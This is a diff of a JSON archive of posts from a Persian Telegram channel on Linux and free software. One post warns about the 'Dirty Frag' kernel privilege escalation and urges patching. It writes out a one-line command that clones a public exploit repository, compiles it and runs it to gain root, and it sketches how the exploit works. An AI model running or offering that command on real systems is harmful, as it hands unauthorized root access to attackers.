@@ -8,35 +8,11 @@
   "posts": [
     {
       "id": 0,
-      "message": "در زمان قطعی اینترنت مینت نسخه‌های hwe خودش رو هم معرفی کرد.\u003cbr/\u003e\u003cbr/\u003e\u003cbr/\u003eکه این‌ها از سخت‌افزارهای جدیدتر پشتیبانی می‌کنن، مثلا کارت گرافیک‌ها و ....\u003cbr/\u003e\u003cbr/\u003e\u003cbr/\u003e\u003ca href=\"https://t.me/SohrabContents\" target=\"_blank\"\u003e@SohrabContents\u003c/a\u003e",
-      "date": "2026-05-10T09:41:48Z",
-      "edited": false,
-      "edit_date": "0001-01-01T00:00:00Z",
-      "views": 987,
-      "forwards": 0,
-      "replies": 0,
-      "sender_id": 0,
-      "sender_name": "محتوای آزاد سهراب"
-    },
-    {
-      "id": 0,
-      "message": "من سال‌ها از منفعل بودن جامعه نرم‌افزار آزاد ایران نوشته بودم و الان تصمیمم رو در قبالش گرفتم که توی این پست بلاگی که اخر لینکش رو می‌ذارم اعلام کردم. \u003cbr/\u003e\u003cbr/\u003e\u003cbr/\u003eمن ترجیح میدم از الان به صورت یک توسعه دهنده مستقل از این جریانات فعالیت کنم، جریاناتی که جز اتلاف وقت و ... نتیجه‌ای نداشت.\u003cbr/\u003e\u003cbr/\u003eجامعه نرم‌افزارآزاد ایران به شدت با حکومت حاکم بر ایران گره خورده.\u003cbr/\u003e\u003cbr/\u003eبخصوص اگر شما وسط بازی باشید و ببینید که داریا همراه میاد و بودجه توسعه یک رام اندرویدی رو تأمین می‌کنه و بعدش اون رو به عنوان یک رام هندی به بقیه معرفی می‌کنن و در انتها هم میان با پوشیدن تیشرتش همه جا اون رو به‌زور برای مردم نصب می‌کنن و در کنارش یک داریا هم می‌فروشن بهش پی‌می‌برید.\u003cbr/\u003e\u003cbr/\u003e\u003cbr/\u003e\u003ca href=\"https://blog.sohrabbehdani.ir/fossir/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://blog.sohrabbehdani.ir/fossir/\u003c/a\u003e\u003cbr/\u003e\u003cbr/\u003eمن دیگه با جامعه نرم‌افزار آزاد ایران کاری ندارم، خودشان بمانند و کاستوم رام بومی خودشان.\u003cbr/\u003e\u003cbr/\u003e\u003cbr/\u003eخلاصه: من کدم رو میزنم، مشارکتم رو می‌کنم، لاگم رو شرکت می‌کنم ولی دیگه به رویدادها و کارهای این‌ها کاری ندارم.\u003cbr/\u003e\u003cbr/\u003e\u003ca href=\"https://t.me/SohrabContents\" target=\"_blank\"\u003e@SohrabContents\u003c/a\u003e",
-      "date": "2026-05-10T11:00:51Z",
-      "edited": false,
-      "edit_date": "0001-01-01T00:00:00Z",
-      "views": 951,
-      "forwards": 0,
-      "replies": 0,
-      "sender_id": 0,
-      "sender_name": "محتوای آزاد سهراب"
-    },
-    {
-      "id": 0,
       "message": "دوباره یه مشکل امنیتی حاد در کرنل لینوکس داریم که باهاش هر یوزر لوکال می تونه دسترسی روت بگیره. بهش می گن درتی فرگ. \u003cbr/\u003e\u003cbr/\u003eرپوزیتوری اینجاست:‌\u003cbr/\u003e\u003ca href=\"https://github.com/V4bel/dirtyfrag\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/V4bel/dirtyfrag\u003c/a\u003e\u003cbr/\u003eو دستوری که دسترسی می ده اینه: \u003cbr/\u003egit clone \u003ca href=\"https://github.com/V4bel/dirtyfrag.git\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/V4bel/dirtyfrag.git\u003c/a\u003e \u0026amp;\u0026amp; cd dirtyfrag \u0026amp;\u0026amp; gcc -O0 -Wall -o exp exp.c -lutil \u0026amp;\u0026amp; ./exp\u003cbr/\u003e\u003cbr/\u003eکه مشخصه یه فایل رو میگیره و کامپایل و اجرا می کنه. این فایل سی، توی یه زنجیره پیش می ره: فایل سو رو لود می کنه، یه پایپ درست می کنه، هر دو رو توی یک فرگمنت از یه پیج نگه می داره و بعد دسترسی نوشتن میگیره و تغییرش می ده و بعد دیگه می شه اجراش کرد. \u003cbr/\u003e\u003cbr/\u003eتوی این ویدئو تا حد معقولی با نگاه به کدهای کرنل توضیحش می دم:\u003cbr/\u003e\u003ca href=\"https://youtu.be/DbXWIYpxCVE\" target=\"_blank\" rel=\"noopener\"\u003ehttps://youtu.be/DbXWIYpxCVE\u003c/a\u003e\u003cbr/\u003e\u003cbr/\u003eآپدیت کنین و تکرار کنین که قطع اینترنت چند تا سرور و کامپیوتر شخصی رو در کشور رو ناامن نگه خواهد داشت.\u003cbr/\u003e\u003cbr/\u003e\u003ca href=\"?q=%23%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3\"\u003e#لینوکس\u003c/a\u003e \u003ca href=\"?q=%23%D8%A7%D9%85%D9%86%DB%8C%D8%AA\"\u003e#امنیت\u003c/a\u003e",
       "date": "2026-05-10T16:11:12Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 635,
+      "views": 641,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -48,7 +24,7 @@
       "date": "2026-05-10T17:59:18Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 1000,
+      "views": 1010,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -60,7 +36,7 @@
       "date": "2026-05-10T20:03:16Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 870,
+      "views": 880,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -78,7 +54,7 @@
       "date": "2026-05-11T09:42:45Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 942,
+      "views": 944,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -86,7 +62,7 @@
       "media": [
         {
           "type": "photo",
-          "url": "https://cdn4.telesco.pe/file/W3erYfzuzBIfKOY5U2WpW119KfG7F6mNuAcwaDuhr3qLFxdcRX8vKAZX8v4b8dcIhvjWl66Abr7N90vPnDzOyunVP6xc7Wvy5GVl892uQMXopDEsQbKBbs3oO25e284VME6kZt2JQttTm_3inYBPy1vN35prM9GzoaqcQRiaT_xqegbMzZQZEJKeRqfbjbWndWvM3gxEd9Im5wuehhcHHsq7-z1ZXn8Nw5PKYijGgyCtseIGtf91Of0OHr7gjp9oFZdnoF0fce343jiMum7SU6nqQDvcXKMsdO0A_aTzxrw5PBQ16_zMEwGg9U3cHnFnc32oSLMDpNWWpKNixT60nQ.jpg"
+          "url": "https://cdn4.telesco.pe/file/RV4r4CM3q25enbtYukz39d8KyI-aklTgh4T9-k1Dic-mbCVTSFrAQXS6GTFweCtIUMnRwYNicNQppdWJ3ilFwbcJug1la1Ne4hYtgpVJTDv-Hi4N0Ib9ameXs1s1lksv_wlR8Kfs5ukCFYvcNfFbbzi1w4G4IB2XjePNL6C4BLA-Hbr29LeVCVD7A-oQji0jFvTx_Rw05UuEIxgx7Gtd7DtB2MaGiFVpQk5JDMZrqd29pbrWm78vHGJ0puXoA19c5XLLqvmFYo_ro4aFtZGknViznffzhgDv7etvqraNP52_ktosqTP2ohVOBJ005x_YIQaLO3roVrUi0sSwdoUi_Q.jpg"
         }
       ]
     },
@@ -114,7 +90,7 @@
       "date": "2026-05-11T19:44:10Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 1020,
+      "views": 1030,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -132,7 +108,7 @@
       "date": "2026-05-11T19:47:14Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 1010,
+      "views": 1020,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -144,7 +120,7 @@
       "date": "2026-05-12T08:14:11Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 941,
+      "views": 952,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -152,7 +128,7 @@
       "media": [
         {
           "type": "photo",
-          "url": "https://cdn4.telesco.pe/file/BwY7NMCspotW_lI6AbinJEFpAyVkR8JF77nK7jVi7-BvHpPif3p6QuEvn_Ii1zwLbZwhXG5-NI5g1ZsB8OSvRlnYkcdso6KrygKhN88_fDTXO0s5BkKf7t8dPZoRKRLUetww4oYKs5p9jhfaiLsq4vTFc1Z2TispKQHlzbRxUR6ghueqHMgsY_9XIxbyDoPvtLFZ8AWjUw2OiYwTNZ_GjbzFS1LNMnHVZYo-Y2zFpaeP7kXZsC3REXQWLtNMBCv_PmOTeXqX1D9uSXg8zDuKiwlbiHxAHeZVh_ywQZPq06hTGAyuYAhcKku7veuglQPnEyxFbtf4A7HhXA1KqH3R8g.jpg"
+          "url": "https://cdn4.telesco.pe/file/NmWZujDqtUe5xke-Tlk9II5nptjhsjn73BSLhbOiKu47M9bx1n1LxlPFp1jWYc8TbODRUVloAG8yxfE8cDVkCRVlQsEulMdBE9Vsmc1C4cS9CIiayIQa25YkgeYVKM7HiDXn2rPsCNrP8C8FH0hvqaSuaA9uI1YBXSp7zgPF3143moc65k_2c6WNRAFVN06AUaJX8dAqC_mgbklR5loQKUtnR8_agDaHavnwq5afHMHTU_8IXi4ic6Wi2gYCOiYAyx3GNm1ljYAoOkHfbU4qLqU_EZoCUktYVSBhg4_d2HjuNKH7--g5WCI-GGaxqMiFhlkHfqjpDEjbsV3TGfBJ1A.jpg"
         }
       ]
     },
@@ -162,7 +138,7 @@
       "date": "2026-05-12T11:23:36Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 972,
+      "views": 982,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -174,7 +150,7 @@
       "date": "2026-05-12T13:42:39Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 590,
+      "views": 599,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -192,7 +168,7 @@
       "date": "2026-05-13T07:06:53Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 804,
+      "views": 824,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -204,7 +180,7 @@
       "date": "2026-05-13T07:36:23Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 808,
+      "views": 830,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -216,7 +192,7 @@
       "date": "2026-05-13T08:08:04Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 813,
+      "views": 839,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -224,7 +200,7 @@
       "media": [
         {
           "type": "photo",
-          "url": "https://cdn4.telesco.pe/file/f-XvilRcyuCknSQZgE-nbXrltdrOxwUwHZO_5-63Bd1OULDWmxWflJTBR-INF5BcYrxUKSH2C0udM3YWi5IM5qc-jrm52sebn85dFFVvjVSvS9KZBWK9-0ELhu10xHxeeILxgYxLXQ5rpgzTW0sh2oBrUa1Ye7dQSkN7WgnLaPy1n3zvyQEylVPQdcZUyapJGBLurA63DI0HFP2tJteP3phG8v_6VrNqWK66payv6RtAcKrFOgT6BA-nmpntqnRbnAXX2vm7jFSTlqqEi5E7KuPPMPSuoZvo1FcAnHHjRAPAEKNGNsYzytuQGXWqATTHmeBzkqph5_wNbGTW1cW_6g.jpg"
+          "url": "https://cdn4.telesco.pe/file/LERZ7QQkQzTqVJSEKhCqTkMTZ3PiPk-PUStY2QtvlJ1BxiwL42ZQR5tNdwOdzB2fYIEli3JwCHHOUafLzCBK0XCMebQHJq92zDm6W2S0moRMqY7OrlSIcr_JCiNtf9ozp5TE8_yW06gsnS_F4jnwjkWZar5AyIk0gwEOsBBNm2BluvgrHZEkshxNQEb8sjoFEw_IoY0g4txGg4fAeRAk9S86ZnD_W_k8S4IK2VxlJyJFvVIKbuWT5ZSIX8anR6coV9GKPrUtYh0A_AQW7gQbzXKgotVIMYHbBGRGwOlsnX3pAr9ai2pFTRGDIXe6rSmsu6hjhoX5WBW9mABMIF_hbg.jpg"
         }
       ]
     },
@@ -234,7 +210,7 @@
       "date": "2026-05-13T10:17:15Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 792,
+      "views": 831,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -246,7 +222,7 @@
       "date": "2026-05-13T16:00:26Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 636,
+      "views": 710,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -258,7 +234,7 @@
       "date": "2026-05-13T17:25:53Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 603,
+      "views": 684,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -270,7 +246,7 @@
       "date": "2026-05-13T18:24:38Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 583,
+      "views": 675,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -288,7 +264,7 @@
       "date": "2026-05-13T19:19:26Z",
       "edited": false,
       "edit_date": "0001-01-01T00:00:00Z",
-      "views": 554,
+      "views": 665,
       "forwards": 0,
       "replies": 0,
       "sender_id": 0,
@@ -299,7 +275,37 @@
           "url": "https://cdn4.telesco.pe/file/tY4Auju2ZFFfl1EtqEbGVUbnDss3kJnnIcUcdyjaDvp0al6OsgdJO7JJY8B_nCfxHtG0crYZWwPoQCfPWj_dNhlNGlUr_ECOJ-ogNTSBbkeS3Jjtp5DJf5Lkcg2m-0sDGjPsGFb5XEIx8ed_sGj77Lw38d2nH2-I61tnR__MyWayy6dBUQRk79bLw-GeI_1b2Q2JRkRJVz1YxeZyfiNP5oTv3svln8bccMlSno2p0i-7hHuCWlNLKgEV5yv30VXWUU-RyO0x1bkbxJU1GwrkwpOu-ZldXAOgZ-LbKglNAHbBuCqrFJeqAtfIP85mo_3DUCbH0agQ0NXLseXkHVJEEQ.jpg"
         }
       ]
+    },
+    {
+      "id": 0,
+      "message": "چندتا خبر خوندم که گوگل، کروم او اس رو داده لاکار و الان اومده سراغ اندروید روی دسکتاپ.\u003cbr/\u003e\u003cbr/\u003eاندروید روی دسکتاپ:\u003cbr/\u003e\u003cbr/\u003e\u003ca href=\"https://www.aparat.com/v/pkp9b6s\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.aparat.com/v/pkp9b6s\u003c/a\u003e\u003cbr/\u003e\u003cbr/\u003e\u003cbr/\u003eکلا بعضی چیزها برای بعضی‌جاها طراحی نشدن، بخصوص این مورد که اندروید این تلاش‌ها رو زیاد کرد و هیچوقت نتیجه جالبی نداشت.\u003cbr/\u003e\u003cbr/\u003e\u003cbr/\u003e\u003ca href=\"https://t.me/SohrabContents\" target=\"_blank\"\u003e@SohrabContents\u003c/a\u003e",
+      "date": "2026-05-14T07:58:08Z",
+      "edited": false,
+      "edit_date": "0001-01-01T00:00:00Z",
+      "views": 258,
+      "forwards": 0,
+      "replies": 0,
+      "sender_id": 0,
+      "sender_name": "محتوای آزاد سهراب"
+    },
+    {
+      "id": 0,
+      "message": "اگر دوباره نمیدوراتاشید باید بگم که استک نتورک لینوکس دوباره CVE خورد دیروز.\u003cbr/\u003e\u003cbr/\u003e\u003cbr/\u003e\u003ca href=\"https://access.redhat.com/security/cve/cve-2026-46300\" target=\"_blank\" rel=\"noopener\"\u003ehttps://access.redhat.com/security/cve/cve-2026-46300\u003c/a\u003e\u003cbr/\u003e\u003cbr/\u003e\u003cbr/\u003eاین از ورینت‌های Dirty Frag عه و همشون با page cache انجام میشن\u003cbr/\u003e\u003cbr/\u003e\u003ca href=\"https://t.me/SohrabContents\" target=\"_blank\"\u003e@SohrabContents\u003c/a\u003e",
+      "date": "2026-05-14T08:37:18Z",
+      "edited": false,
+      "edit_date": "0001-01-01T00:00:00Z",
+      "views": 183,
+      "forwards": 0,
+      "replies": 0,
+      "sender_id": 0,
+      "sender_name": "محتوای آزاد سهراب",
+      "media": [
+        {
+          "type": "photo",
+          "url": "https://cdn4.telesco.pe/file/K9l-UTwsIIiZyyRRGK1QVAScK_b9UZnPjnCDa24YKzN4LBXYFdsbh39ElTZyV6oJUJlsxm4qjkSD6iNf949aOh4ZbkUnJyXXlkHargQCnII9NRHsELZ0019rMzVl-dQNudp-Ei1H-cW6xKvw0w8E7N-C5ZQBWRM22H4pExP2FFdn65RnomAagZSSwz-pXM_rdl5-1PwdIMSIkvgocaOhXzLZqiKOSm_CMBZKE8WeXgJ7xFizIgst-tn5_Bu6qZcmQY0wWGPYt7DGYfsi_xkpNjlzWt7HVqlPny5DrRuxQ9eq6SfbO8gvq5bxd1DlunqF7ZYTT2pe8z8F8vyCis9EQA.jpg"
+        }
+      ]
     }
   ],
-  "last_updated": 1778738495
+  "last_updated": 1778750022
 }
